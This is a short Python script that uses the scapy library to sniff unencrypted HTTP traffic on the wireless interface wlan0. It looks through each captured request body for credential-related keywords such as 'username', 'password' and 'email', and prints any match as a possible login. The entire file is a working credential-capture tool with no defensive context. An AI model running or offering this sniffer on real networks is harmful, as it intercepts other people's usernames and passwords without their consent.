import scapy.all as scapy
from scapy.layers import http

def sniff(interface):        
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass" , "uname", "email", "mail", "name", "passw"]
            for keyword in keywords:
                if keyword in load:
                    print("[+] Possible username/password >> " + load + "\n\n")
                    break

        

sniff("wlan0")  